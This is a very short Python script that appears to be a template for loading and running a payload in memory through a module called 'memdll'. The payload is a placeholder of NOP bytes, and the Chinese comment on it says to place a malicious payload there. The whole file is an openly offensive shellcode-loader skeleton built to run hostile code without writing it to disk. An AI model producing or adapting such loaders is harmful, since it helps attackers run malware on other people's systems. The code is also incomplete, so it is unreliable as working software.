import memdll

def load_payload():
    payload = b'\x90\x90\x90\x90\x90...'  # 放置你的惡意有效負載
    memdll.callfunc(payload)

load_payload()